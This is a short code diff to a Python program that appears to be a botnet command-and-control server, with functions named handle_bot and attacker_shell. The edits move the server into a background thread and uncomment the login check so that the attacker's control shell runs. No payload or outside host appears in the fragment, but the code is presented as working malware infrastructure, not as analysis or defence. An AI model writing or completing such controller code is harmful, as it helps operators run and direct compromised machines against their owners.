@@ -21,6 +21,7 @@ def handle_bot(conn, addr):
     try:
         while True:
             data = conn.recv(1024)
+
             if not data:
                 break
 
@@ -90,7 +91,7 @@ def attacker_shell():
 
 
 if __name__ == "__main__":
-    start_server()
+    threading.Thread(target=start_server, daemon=True).start()
 
-    #if login():
-   #     attacker_shell()
+    if login():
+        attacker_shell()
